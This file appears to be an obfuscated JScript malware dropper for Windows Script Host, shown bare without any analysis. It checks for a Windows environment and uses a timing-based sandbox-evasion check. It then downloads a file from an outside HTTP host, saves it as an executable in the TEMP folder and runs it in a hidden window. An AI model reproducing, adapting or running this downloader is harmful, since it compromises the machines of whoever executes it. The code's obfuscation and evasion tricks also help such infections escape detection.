var Uw = false;
var r = "CreateObject";
var SG = function ZW() {return WScript[r]("WScript.Shell");}(), e = 11;
var f = "MSXML2.XMLHTTP";
var OC = 2123213;
var M = 0;
function ys(Qc){SG["Run"](Qc, M, M);};
function R(){return "" + f;};
function qx(B, Q){M = M * 1; return B - Q;};
function C0(){return r;};
/*@cc_on
  @if (@_win32 || @_win64)
    Uw = true;
  @end
@*/
if (Uw)
{
var w = "";
function C(){return 22;};
var X = 0; var v = 0;
function rX()
{
var aT = new this["Date"]();
var V = aT["getUTCMilliseconds"]();
WScript["Sleep"](C());
var aT = new this["Date"]();
var ZA = aT["getUTCMilliseconds"]();
WScript["Sleep"](C());
var aT = new this["Date"]();
var G = aT["getUTCMilliseconds"]();
var X = "gf";
X = qx(ZA, V);
var v = "wg";
v = qx(G, ZA);
w = "open";
return qx(X, v);
}
var km = false;
var lH = false;
for (var MZ = M; MZ < C() * 1; MZ++){if (rX() != M){
km = true; 
v = "31" + 11 * X + v; 
lH = true; 
break;
}}
function RR() {return ((km == true) && (km == lH)) ? 1 : M;};
if (km && RR() && lH){
function g() {return SG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "8N8YkNaMMU.exe";};
 X0 = R();
 e0 = WScript[r](X0);
 var k = 1;
 while (k){
try {
e0[w]("GET", "http://digimacro.com.br/m8isda", false);
e0["send"]();
x = "Sleep";
for (;;){WScript[x](C() * 11); if (e0["readystate"] >= 2 * 2) break;};
k = M;
} catch(tR){};
}
function u(DZ) {var Zq = (1, 2, 3, 4, 5, DZ); return Zq;};
J = WScript[C0()]("ADODB.Stream");
X0 = J;
X0[w]();
X0["type"] = u(1);
X0["write"](e0["ResponseBody"]);
J["position"] = u(M);
X0["Save" + "ToFile"](g(), 2);
J["c"+"lose"]();
hr = g();
ys(hr);
}
}

